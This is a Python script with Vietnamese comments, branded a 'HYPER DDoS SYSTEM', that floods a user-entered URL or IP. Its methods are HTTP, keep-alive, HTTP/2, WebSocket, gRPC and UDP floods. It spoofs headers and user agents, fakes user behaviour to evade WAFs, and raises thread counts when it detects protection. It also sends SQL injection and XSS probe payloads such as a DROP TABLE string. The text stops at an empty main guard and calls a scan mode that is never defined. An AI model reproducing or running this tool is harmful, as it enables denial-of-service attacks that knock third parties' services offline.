#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bao 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
import socket
import ssl
import whois
from bs4 import BeautifulSoup
import asyncio
import aiohttp
import aiohttp_socks
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint
from rich.layout import Layout
from fake_useragent import UserAgent
from playwright.async_api import async_playwright
import secrets
import urllib3
import http.client
from h2.connection import H2Connection
from h2.config import H2Configuration
import grpc
import aiohttp.client_exceptions

# Thử sử dụng uvloop nếu có, nếu không thì dùng asyncio mặc định
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    rprint("[success][HỆ THỐNG] Sử dụng uvloop để tối ưu hiệu suất asyncio[/]")
except ImportError:
    rprint("[warning][HỆ THỐNG] uvloop không khả dụng, sử dụng vòng lặp asyncio mặc định[/]")

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Khởi tạo rich console với theme hacker
custom_theme = Theme({
    "info": "bright_cyan",
    "warning": "bright_yellow",
    "error": "red bold",
    "success": "green bold",
    "highlight": "bright_magenta blink",
})
console = Console(theme=custom_theme)

# Khởi tạo fake User-Agent
ua = UserAgent()

# Banner hacker siêu chất
def display_banner():
    banner = Text("""
        ╔═════════════════════════════════════════════════════════════╗
        ║        ☠  QUANG BAO 2025 - HYPER DDoS SYSTEM  ☠            ║
        ║  ███╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ██╗   ██╗            ║
        ║  ████╗  ██║██╔══██╗████╗  ██║██╔═══██╗██║   ██║            ║
        ║  ██╔██╗ ██║███████║██╔██╗ ██║██║   ██║██║   ██║            ║
        ║  ██║╚██╗██║██╔══██║██║╚██╗██║██║   ██║██║   ██║            ║
        ║  ██║ ╚████║██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝            ║
        ║  ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝             ║
        ║  [ Powered by Codespaces - Advanced Bypass Edition 2025 ]   ║
        ╚═════════════════════════════════════════════════════════════╝
    💀 Vượt Mọi Rào Cản, Không Bị Chặn, Tấn Công Hợp Pháp 💀
    """, style="success")
    console.print(Panel(banner, title="🔥 QUANG BAO HYPER SYSTEM 🔥", border_style="highlight"))

# Kiểm tra tính toàn vẹn file
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning][HỆ THỐNG] Tạo mã băm mới: {file_hash}[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error][LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.[/]")
                exit(1)
    except Exception as e:
        console.print(f"[error][LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}[/]")
        exit(1)

# Xóa màn hình
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Hiệu ứng khóa mục tiêu
def target_selection_effect(target_type):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]🔒 KHÓA MỤC TIÊU: {target_type.upper()}[/]", total=100)
        for i in range(0, 101, 20):
            progress.update(task, advance=20, description=f"[info]🔒 KHÓA MỤC TIÊU: {target_type.upper()} [{i}%]...[/]")
            time.sleep(0.2)
        progress.update(task, description=f"[success]✅ MỤC TIÊU ĐÃ KHÓA: {target_type.upper()} [100%]![/]")

# Hiệu ứng tải
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]![/]")

# Danh sách proxy hợp pháp (cần thay bằng danh sách proxy được cấp phép)
PROXY_LIST = [
    # Ví dụ: "http://proxy1.example.com:8080",
    # Thêm proxy được cấp phép tại đây
]
GEO_LOCATIONS = ['US', 'EU', 'ASIA', 'AU']  # Mô phỏng khu vực địa lý

# Tạo header ngẫu nhiên với cookie và API key
def generate_random_headers(api_key=None):
    headers = {
        'User-Agent': ua.random,
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Cookie': f"session_id={secrets.token_hex(16)}; user_id={random.randint(1000,9999)}",
    }
    if api_key:
        headers['Authorization'] = f"Bearer {api_key}"
    return headers

# Dữ liệu POST ngẫu nhiên
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": secrets.token_hex(16),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
}

# Bộ đếm toàn cục
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
rate_limit_count = 0

# Xác thực URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

# Lưu cấu hình tấn công
def save_attack_config(url, num_threads, requests_per_thread, target_type, api_key=None):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "api_key": api_key
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        console.print(f"[warning][HỆ THỐNG] Cấu hình tấn công đã lưu: {url}[/]")
    except Exception as e:
        console.print(f"[error][LỖI] Không thể lưu cấu hình: {str(e)}[/]")

# Token Bucket để điều tiết lưu lượng
class TokenBucket:
    def __init__(self, capacity, rate):
        self.capacity = capacity
        self.tokens = capacity
        self.rate = rate
        self.last_refill = time.time()

    def _refill(self):
        now = time.time()
        new_tokens = (now - self.last_refill) * self.rate
        self.tokens = min(self.capacity, self.tokens + new_tokens)
        self.last_refill = now

    def consume(self):
        self._refill()
        if self.tokens >= 1:
            self.tokens -= 1
            return True
        return False

# Đánh giá bảo mật mục tiêu
async def assess_target_security(url, api_key=None):
    security_level = "TRUNG BÌNH"
    recommended_threads = 3000
    recommended_requests = 3000

    async with aiohttp.ClientSession() as session:
        try:
            headers = generate_random_headers(api_key)
            response = await session.head(url, headers=headers, timeout=5, ssl=False)
            headers = response.headers

            waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'aws', 'google']
            server = headers.get('Server', '').lower()
            cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)

            rate_limit = 'X-RateLimit-Limit' in headers or response.status in (429, 403)

            domain = urllib.parse.urlparse(url).hostname
            whois_info = whois.whois(domain)
            creation_date = whois_info.get('creation_date')
            domain_age = (datetime.now() - creation_date[0]).days if creation_date and isinstance(creation_date, list) else 0

            if cdn_waf_detected or rate_limit:
                security_level = "CAO"
                recommended_threads = 15000
                recommended_requests = 6000
            elif domain_age > 365:
                security_level = "TRUNG BÌNH"
                recommended_threads = 6000
                recommended_requests = 3000
            else:
                security_level = "THẤP"
                recommended_threads = 1500
                recommended_requests = 1500

            console.print(f"[info][HỆ THỐNG] Đánh giá bảo mật: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}[/]")
        except Exception as e:
            console.print(f"[warning][HỆ THỐNG] Không thể đánh giá bảo mật: {str(e)}[/]")
            security_level = "TRUNG BÌNH"
            recommended_threads = 3000
            recommended_requests = 3000

    return security_level, recommended_threads, recommended_requests

# Quét lỗ hổng web
async def scan_vulnerabilities(url, api_key=None):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(api_key), timeout=5, ssl=False) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database error"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Potential SQL Injection detected: {payload}",
                            "recommendation": "Use prepared statements, sanitize inputs."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] SQL Injection scan failed: {str(e)}[/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(api_key), timeout=5, ssl=False) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS detected: {payload}",
                            "recommendation": "Encode output, use CSP."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] XSS scan failed: {str(e)}[/]")

        try:
            async with session.get(url, headers=generate_random_headers(api_key), timeout=5, ssl=False) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    if not form.find('input', {'name': lambda x: x and 'csrf' in x.lower()}):
                        vulnerabilities.append({
                            "type": "CSRF",
                            "severity": "Medium",
                            "description": f"Form at {form.get('action', 'unknown')} lacks CSRF token.",
                            "recommendation": "Implement CSRF tokens."
                        })
        except Exception as e:
            console.print(f"[warning][VULN SCAN] CSRF scan failed: {str(e)}[/]")

    return vulnerabilities

# Hiển thị báo cáo lỗ hổng
def display_vulnerability_report(vulnerabilities):
    table = Table(title="🔍 BÁO CÁO LỖ HỔNG BẢO MẬT", style="info")
    table.add_column("Loại", style="highlight")
    table.add_column("Mức độ", style="warning")
    table.add_column("Mô tả")
    table.add_column("Khuyến nghị", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success][VULN SCAN] Không phát hiện lỗ hổng! ✅[/]")
    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")

# Giả lập hành vi người dùng với Playwright
async def simulate_user_behavior(url, api_key=None):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent=ua.random,
            locale=random.choice(['en-US', 'vi-VN', 'fr-FR']),
            viewport={'width': 1280, 'height': 720}
        )
        page = await context.new_page()
        try:
            headers = generate_random_headers(api_key)
            await page.set_extra_http_headers(headers)
            await page.goto(url, timeout=30000)
            await page.evaluate("""
                () => {
                    window.scrollTo(0, document.body.scrollHeight);
                    setTimeout(() => {
                        document.querySelectorAll('button, a').forEach(el => {
                            if (Math.random() < 0.1) el.click();
                        });
                    }, 1000);
                }
            """)
            await asyncio.sleep(random.uniform(1, 3))  # Mô phỏng thời gian người dùng
            console.print(f"[success][USER SIM] Mô phỏng hành vi người dùng thành công trên {url}[/]")
        except Exception as e:
            console.print(f"[error][USER SIM] Lỗi mô phỏng hành vi: {str(e)}[/]")
        finally:
            await browser.close()

# Tấn công HTTP/2
async def http2_multiplexing_attack(url, api_key=None):
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        async with aiohttp.ClientSession() as session:
            conn = H2Connection(config=H2Configuration(client_side=True))
            conn.initiate_connection()
            headers = {
                ':method': 'GET',
                ':path': parsed_url.path or '/',
                ':scheme': 'https',
                ':authority': host,
                'user-agent': ua.random,
            }
            if api_key:
                headers['authorization'] = f"Bearer {api_key}"
            for _ in range(100):
                for stream_id in range(1, 100, 2):
                    conn.send_headers(stream_id, headers)
                    async with session.get(url, headers=generate_random_headers(api_key), ssl=False) as response:
                        if response.status in (429, 403):
                            console.print(f"[error][HTTP/2] Mã trạng thái {response.status} - MỤC TIÊU CHẶN[/]")
                            global rate_limit_count
                            rate_limit_count += 1
                        else:
                            console.print(f"[warning][HTTP/2] Mã trạng thái {response.status}[/]")
                await asyncio.sleep(random.uniform(0.01, 0.1))  # Ngẫu nhiên delay
    except Exception as e:
        console.print(f"[error][HTTP/2] Tấn công thất bại: {str(e)}[/]")

# Tấn công Keep-Alive
async def keep_alive_pipelining_attack(url, api_key=None):
    async with aiohttp.ClientSession() as session:
        headers = generate_random_headers(api_key)
        headers['Connection'] = 'keep-alive'
        headers['Keep-Alive'] = 'timeout=5, max=1000'
        while True:
            try:
                for _ in range(10):
                    async with session.get(url, headers=headers, proxy=random.choice(PROXY_LIST) if PROXY_LIST else None, ssl=False) as response:
                        if response.status in (429, 403):
                            console.print(f"[error][KEEP-ALIVE] Mã trạng thái {response.status} - MỤC TIÊU CHẶN[/]")
                            global rate_limit_count
                            rate_limit_count += 1
                        else:
                            console.print(f"[warning][KEEP-ALIVE] Mã trạng thái {response.status}[/]")
                    await asyncio.sleep(random.uniform(0.05, 0.2))  # Ngẫu nhiên delay
            except Exception as e:
                console.print(f"[error][KEEP-ALIVE] Tấn công thất bại: {str(e)}[/]")
                break

# Tấn công bất đồng bộ
async def async_request(url, session, token_bucket, api_key=None, endpoints=None):
    global success_count, error_count, response_times, rate_limit_count
    if not token_bucket.consume():
        await asyncio.sleep(random.uniform(0.1, 0.5))  # Chờ khi hết token
        return
    try:
        start_time = time.time()
        target_url = f"{url}{random.choice(endpoints)}" if endpoints else url
        headers = generate_random_headers(api_key)
        async with session.get(target_url, headers=headers, proxy=random.choice(PROXY_LIST) if PROXY_LIST else None, ssl=False) as response:
            elapsed = (time.time() - start_time) * 1000
            with manager:
                response_times.append(elapsed)
                if response.status in (429, 403):
                    console.print(f"[error][ASYNC] Mã trạng thái {response.status} - MỤC TIÊU CHẶN[/]")
                    rate_limit_count += 1
                    error_count += 1
                else:
                    console.print(f"[warning][ASYNC] Mã trạng thái {response.status} - Thời gian: {elapsed:.2f}ms[/]")
                    success_count += 1
    except Exception as e:
        console.print(f"[error][ASYNC] Tấn công thất bại: {str(e)}[/]")
        with manager:
            error_count += 1

async def async_attack(url, token_bucket, api_key=None, endpoints=None):
    async with aiohttp.ClientSession(headers=generate_random_headers(api_key)) as session:
        tasks = [async_request(url, session, token_bucket, api_key, endpoints) for _ in range(10)]
        await asyncio.gather(*tasks)

# Tấn công WebSocket
async def websocket_attack(url, api_key=None):
    ws_url = url.replace("http", "ws").replace("https", "wss")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.ws_connect(ws_url, headers=generate_random_headers(api_key), ssl=False) as ws:
                for _ in range(100):
                    await ws.send_str(json.dumps({"ping": secrets.token_hex(8)}))
                    response = await ws.receive()
                    console.print(f"[success][WEBSOCKET] Gửi ping, nhận: {response.data}[/]")
                    await asyncio.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        console.print(f"[error][WEBSOCKET] Tấn công thất bại: {str(e)}[/]")

# Tấn công gRPC (giả lập)
async def grpc_attack(url, api_key=None):
    try:
        async with aiohttp.ClientSession() as session:
            headers = generate_random_headers(api_key)
            headers['Content-Type'] = 'application/grpc'
            async with session.post(url, headers=headers, data=b'\x00\x00\x00\x00\x05\x0a\x03foo', ssl=False) as response:
                console.print(f"[success][gRPC] Mã trạng thái {response.status}[/]")
    except Exception as e:
        console.print(f"[error][gRPC] Tấn công thất bại: {str(e)}[/]")

# Tấn công UDP tầng 4
def udp_flood_attack(host, port, token_bucket):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while token_bucket.consume():
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            console.print(f"[error][UDP FLOOD] Gửi gói tin đến {host}:{port}[/]")
            time.sleep(random.uniform(0.01, 0.1))  # Ngẫu nhiên delay
    except Exception as e:
        console.print(f"[error][UDP FLOOD] Tấn công thất bại: {str(e)}[/]")
    finally:
        sock.close()

# Cấu hình mục tiêu
TARGET_CONFIGS = [
    {"id": "1", "name": "basic", "threads": 300, "requests": 300, "desc": "Tấn công cơ bản", "level": "Thấp", "application": "Kiểm tra mục tiêu"},
    {"id": "2", "name": "medium", "threads": 1500, "requests": 1500, "desc": "Tấn công trung bình", "level": "Thấp-Trung bình", "application": "Máy chủ nhỏ"},
    {"id": "3", "name": "advanced", "threads": 3000, "requests": 3000, "desc": "Tấn công nâng cao", "level": "Trung bình", "application": "Máy chủ vừa"},
    {"id": "4", "name": "ultra", "threads": 30000, "requests": 3000, "desc": "Tấn công siêu mạnh", "level": "Trung bình-Cao", "application": "Mục tiêu bảo vệ tốt"},
    {"id": "5", "name": "infinite", "threads": 6000, "requests": 3000, "desc": "Tấn công vòng lặp", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
    {"id": "6", "name": "unlimited", "threads": 30000, "requests": 3000, "desc": "Tấn công vô hạn", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
    {"id": "7", "name": "overload", "threads": 45000, "requests": 6000, "desc": "Tấn công quá tải 429/403", "level": "Cao", "application": "Hệ thống giới hạn"},
    {"id": "8", "name": "blitz", "threads": 60000, "requests": 9000, "desc": "Tấn công chớp nhoáng 522", "level": "Cao", "application": "Gián đoạn kết nối"},
    {"id": "9", "name": "layer3_4", "threads": 60000, "requests": 15000, "desc": "Tấn công UDP tầng 3/4", "level": "Cao", "application": "Gián đoạn mạng"},
    {"id": "10", "name": "combined", "threads": 75000, "requests": 12000, "desc": "Tấn công đa kỹ thuật", "level": "Cao", "application": "Mục tiêu phức tạp"},
    {"id": "11", "name": "layer7", "threads": 75000, "requests": 12000, "desc": "Tấn công tầng 7", "level": "Cao", "application": "Quá tải web"},
    {"id": "12", "name": "multi_vector", "threads": 90000, "requests": 18000, "desc": "Tấn công đa vector", "level": "Rất Cao", "application": "Mục tiêu lớn"},
    {"id": "13", "name": "god", "threads": 90000, "requests": 3000, "desc": "Tấn công cấp thần", "level": "Rất Cao", "application": "Mục tiêu bảo mật cao"},
    {"id": "14", "name": "hyper", "threads": 30000000, "requests": 3000, "desc": "Tấn công siêu tốc", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "15", "name": "supra", "threads": 60000000, "requests": 3000, "desc": "Tấn công tối cao", "level": "Cực Cao", "application": "Mục tiêu siêu lớn"},
    {"id": "16", "name": "pulsar", "threads": 90000000, "requests": 3000, "desc": "Tấn công pulsar", "level": "Cực Cao", "application": "Hệ thống phân tán"},
    {"id": "17", "name": "quasar", "threads": 105000000, "requests": 3000, "desc": "Tấn công quasar", "level": "Cực Cao", "application": "Hệ thống CDN"},
    {"id": "18", "name": "prime", "threads": 150000000, "requests": 3000, "desc": "Tấn công prime", "level": "Cực Cao", "application": "Hệ thống tải cao"},
    {"id": "19", "name": "cosmic", "threads": 180000000, "requests": 3000, "desc": "Tấn công cosmic", "level": "Cực Cao", "application": "Hệ thống lớn"},
    {"id": "20", "name": "ultima", "threads": 300000000, "requests": 3000, "desc": "Tấn công tối thượng", "level": "Cực Cao", "application": "Hệ thống doanh nghiệp"},
    {"id": "21", "name": "nova", "threads": 300000000, "requests": 3000, "desc": "Tấn công supernova", "level": "Cực Cao", "application": "Hệ thống tải lớn"},
    {"id": "22", "name": "titan", "threads": 15000000, "requests": 3000, "desc": "Tấn công titan", "level": "Cực độ", "application": "Hệ thống siêu lớn"},
    {"id": "23", "name": "void", "threads": 702000000, "requests": 3000, "desc": "Tấn công void", "level": "Cực độ", "application": "Mục tiêu siêu bền"},
    {"id": "24", "name": "abyss", "threads": 2100000000, "requests": 3000, "desc": "Tấn công abyss", "level": "Cực độ", "application": "Hệ thống quốc gia"},
    {"id": "25", "name": "omega", "threads": 3000000000, "requests": 3000, "desc": "Tấn công omega", "level": "Cực độ", "application": "Hệ thống siêu bảo mật"},
    {"id": "26", "name": "giga", "threads": 3000000000000, "requests": 3000, "desc": "Tấn công giga", "level": "Tối đa", "application": "Hệ thống toàn cầu"},
    {"id": "27", "name": "websocket", "threads": 1000, "requests": 1000, "desc": "Tấn công WebSocket", "level": "Trung bình", "application": "Kết nối realtime"},
    {"id": "28", "name": "grpc", "threads": 1000, "requests": 1000, "desc": "Tấn công gRPC", "level": "Trung bình", "application": "API hiệu suất cao"},
]

# Hiển thị danh sách chức năng
def display_ordered_functions():
    clear_screen()
    display_banner()
    table = Table(title="🔥 28 CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG 🔥", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Tên", style="success")
    table.add_column("Mô tả")
    table.add_column("Luồng", justify="right")
    table.add_column("Yêu cầu", justify="right")
    table.add_column("Tổng lượt", justify="right")
    table.add_column("Cấp độ")
    table.add_column("Ứng dụng")
    sorted_configs = sorted(TARGET_CONFIGS, key=lambda x: x['threads'] * x['requests'])
    for func in sorted_configs:
        table.add_row(
            func['id'],
            func['name'].upper(),
            func['desc'],
            f"{func['threads']:,}",
            f"{func['requests']:,}",
            f"{func['threads'] * func['requests']:,}",
            func['level'],
            func['application']
        )
    console.print(table)
    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")

# Hiển thị menu mục tiêu
def display_target_menu():
    clear_screen()
    display_banner()
    table = Table(title="🔥 MENU CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG 🔥", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Tên", style="success")
    table.add_column("Mô tả")
    table.add_row("0", "Danh sách", "Xem danh sách chiến lược")
    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
        table.add_row(target['id'], target['name'].upper(), target['desc'])
    console.print(table)

# Hàm chính
def main():
    global rate_limit_count
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    
    # Nhập API key (nếu có)
    api_key = Prompt.ask("[info]Nhập API Key (nhấn Enter nếu không có)[/]", default="")
    
    # Danh sách endpoint ngẫu nhiên
    ENDPOINTS = ['/index', '/home', '/api/v1/status', '/products', '/about', '/contact']
    
    while True:
        try:
            display_target_menu()
            choice = Prompt.ask("[info]Nhập lựa chọn (0-28)[/]")

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                console.print("[error][LỖI] Lựa chọn không hợp lệ! Thử lại.[/]")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            input_url = Prompt.ask("[info]Nhập URL hoặc IP mục tiêu[/]")
            if not input_url:
                console.print("[error][LỖI] URL/IP không được để trống! Thử lại.[/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                console.print(f"[warning][HỆ THỐNG] Xử lý mục tiêu như IP: {host}[/]")

            console.print(f"[success][HỆ THỐNG] Mục tiêu đã khóa: {validated_url}[/]")

            if target['name'] == "vuln_scan":
                console.print("[info][HỆ THỐNG] Bắt đầu quét lỗ hổng web nâng cao...[/]")
                loading_animation("Quét lỗ hổng web", 2)
                vulnerabilities = asyncio.run(scan_vulnerabilities(validated_url, api_key))
                display_vulnerability_report(vulnerabilities)
                continue

            base_threads = target['threads']
            base_requests = target['requests']
            token_bucket = TokenBucket(capacity=base_requests, rate=base_requests/60)  # 1 phút

            console.print("[info][HỆ THỐNG] Đang đánh giá bảo mật...[/]")
            loading_animation("Đánh giá bảo mật", 1)
            security_level, recommended_threads, recommended_requests = asyncio.run(assess_target_security(validated_url, api_key))

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            # Điều chỉnh tốc độ nếu phát hiện rate-limit
            if rate_limit_count > NUM_THREADS * 0.1:
                console.print("[warning][HỆ THỐNG] Phát hiện rate-limit, giảm tốc độ tấn công...[/]")
                NUM_THREADS = max(100, NUM_THREADS // 2)
                REQUESTS_PER_THREAD = max(100, REQUESTS_PER_THREAD // 2)
                token_bucket = TokenBucket(capacity=REQUESTS_PER_THREAD, rate=REQUESTS_PER_THREAD/120)  # Giảm tốc

            panel = Panel(
                f"""
[+] CHIẾN LƯỢC TẤN CÔNG: {target['name'].upper()}
[+] Mục tiêu: {validated_url}
[+] Luồng: {NUM_THREADS:,}
[+] Yêu cầu/Luồng: {REQUESTS_PER_THREAD:,}
[+] Chiến lược: {attack_strategy}
[+] Tổng lượt đánh: {NUM_THREADS * REQUESTS_PER_THREAD:,}
[+] API Key: {api_key if api_key else 'Không sử dụng'}
                """,
                title="🔥 THÔNG TIN TẤN CÔNG 🔥",
                style="info"
            )
            console.print(panel)
            console.print("[error][HỆ THỐNG] Khởi động tấn công...[/]")
            loading_animation("Khởi động hệ thống tấn công", 2)

            start_time = time.time()

            if target['name'] in ("infinite", "unlimited", "overload", "blitz", "combined", "layer3_4", "multi_vector", "layer7", "websocket", "grpc"):
                threads = []
                for _ in range(NUM_THREADS):
                    if target['name'] == "infinite":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "unlimited":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "overload":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "blitz":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "combined":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "layer3_4":
                        t = threading.Thread(target=udp_flood_attack, args=(host, port, token_bucket))
                    elif target['name'] == "multi_vector":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "layer7":
                        t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    elif target['name'] == "websocket":
                        t = threading.Thread(target=asyncio.run, args=(websocket_attack(validated_url, api_key),))
                    elif target['name'] == "grpc":
                        t = threading.Thread(target=asyncio.run, args=(grpc_attack(validated_url, api_key),))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print(f"[warning][HỆ THỐNG] Tấn công {target['name']} bị dừng bởi người dùng[/]")
                    exit(0)
            else:
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=asyncio.run, args=(async_attack(validated_url, token_bucket, api_key, ENDPOINTS),))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print("[warning][HỆ THỐNG] Tấn công bị dừng bởi người dùng[/]")
                    exit(0)

            # Mô phỏng hành vi người dùng
            if random.random() < 0.2:  # 20% khả năng mô phỏng
                console.print("[info][HỆ THỐNG] Mô phỏng hành vi người dùng để tránh WAF...[/]")
                asyncio.run(simulate_user_behavior(validated_url, api_key))

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            report = Panel(
                f"""
[+] BÁO CÁO CHIẾN DỊCH: {target['name'].upper()}
[+] Tổng lượt đánh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}
[+] Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
[+] Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%)
[+] Rate-Limit (403/429): {rate_limit_count:,}
[+] Tổng thời gian: {total_time:.2f} giây
[+] Thời gian phản hồi trung bình: {avg_response_time:.2f}ms
[+] Hiệu suất đỉnh: {max_response_time:.2f}ms
[+] Độ trễ tối thiểu: {min_response_time:.2f}ms
[+] Lượt đánh/giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f}
[+] MỤC TIÊU ĐÃ ĐƯỢC KIỂM TRA!
                """,
                title="🔥 BÁO CÁO TẤN CÔNG 🔥",
                style="success"
            )
            console.print(report)
            rate_limit_count = 0  # Reset bộ đếm rate-limit

        except KeyboardInterrupt:
            console.print("[warning][HỆ THỐNG] Tấn công bị dừng bởi người dùng[/]")
            exit(0)
        except Exception as e:
            console.print(f"[error][HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}[/]")
            exit(1)

if __name__ == "__main__":
